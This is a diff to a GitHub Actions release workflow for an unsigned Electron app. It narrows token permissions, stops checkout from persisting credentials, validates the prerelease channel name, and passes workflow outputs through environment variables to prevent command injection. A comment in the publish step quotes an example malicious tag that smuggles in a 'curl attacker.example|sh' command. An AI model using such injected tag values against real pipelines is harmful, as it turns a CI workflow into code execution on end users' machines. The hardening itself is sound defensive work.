@@ -17,8 +17,18 @@ on:
     tags:
       - 'v*'
 
+# Read-only by default; the two jobs that actually create or upload a Release
+# ask for `contents: write` themselves.
+#
+# Declared at workflow level, this applied to `verify` too — a job whose only
+# work is `npm ci` plus the checks. `actions/checkout` persists the job's token
+# into .git/config by default, and `npm ci` runs install scripts from every one
+# of the ~500 packages in the lockfile: one compromised build dependency could
+# read that token and create or modify a Release. Since a Release is what every
+# installed copy of the app auto-updates from, and the build is unsigned, that
+# turns a dependency compromise straight into code execution on users' machines.
 permissions:
-  contents: write # allow the workflow to create/upload the GitHub Release
+  contents: read
 
 jobs:
   # Nothing gets packaged until this passes. A tag that fails typecheck, lint or
@@ -28,6 +38,11 @@ jobs:
     runs-on: ubuntu-latest
     steps:
       - uses: actions/checkout@v4
+        with:
+          # This job never pushes, so it has no use for a credential in
+          # .git/config — and leaving one there is what a hostile install script
+          # would go looking for.
+          persist-credentials: false
       - uses: actions/setup-node@v4
         with:
           node-version: 20
@@ -47,6 +62,8 @@ jobs:
   # that already exists -- nothing left to race over.
   create-release:
     needs: verify
+    permissions:
+      contents: write # creates the Release object this tag publishes into
     runs-on: ubuntu-latest
     steps:
       - name: Create the GitHub Release for this tag if it doesn't exist yet
@@ -77,6 +94,8 @@ jobs:
 
   build:
     needs: create-release
+    permissions:
+      contents: write # electron-builder uploads the installers onto the Release
     strategy:
       fail-fast: false
       matrix:
@@ -117,6 +136,13 @@ jobs:
           if [[ "$tag" == *-* ]]; then
             pre="${tag#*-}"                          # beta.1
             channel="${pre%%.*}"                     # beta
+            # A channel name is a word, and a tag is attacker-shaped input the
+            # moment anyone but Reuben can push one. Anything outside this set
+            # is not a channel that could work anyway.
+            if [[ ! "$channel" =~ ^[A-Za-z0-9.-]+$ ]]; then
+              echo "::error::Refusing to publish: '${channel}' is not a usable channel name."
+              exit 1
+            fi
             echo "args=--config.publish.releaseType=prerelease --config.publish.channel=${channel}" >> "$GITHUB_OUTPUT"
             echo "what=prerelease -> ${channel}.yml" >> "$GITHUB_OUTPUT"
           else
@@ -125,14 +151,24 @@ jobs:
           fi
 
       - name: Package installer & publish to the Release
-        run: |
-          echo "Publishing as: ${{ steps.kind.outputs.what }}"
-          npx --no-install electron-builder --publish always ${{ steps.kind.outputs.args }}
         shell: bash
         env:
+          # Passed as environment VALUES rather than pasted into the script by
+          # `${{ }}`. That substitution happens before bash ever sees the script,
+          # so a tag named `v1.0.0-a;curl attacker.example|sh;x` used to become
+          # part of the command text itself — arbitrary execution in the one job
+          # holding the Release-write token. Read from the environment, the same
+          # string is only ever an argument.
+          KIND_ARGS: ${{ steps.kind.outputs.args }}
+          KIND_WHAT: ${{ steps.kind.outputs.what }}
           GH_TOKEN: ${{ secrets.GITHUB_TOKEN }}
           # Unsigned MVP: don't let electron-builder try to find a signing identity.
           CSC_IDENTITY_AUTO_DISCOVERY: 'false'
+        run: |
+          echo "Publishing as: $KIND_WHAT"
+          # Unquoted on purpose — this is two separate flags and has to word-split.
+          # shellcheck disable=SC2086
+          npx --no-install electron-builder --publish always $KIND_ARGS
 
   # electron-builder's GitHub publisher silently SKIPS uploading (exit 0, no
   # error) if the release it's publishing to was created more than 2 hours
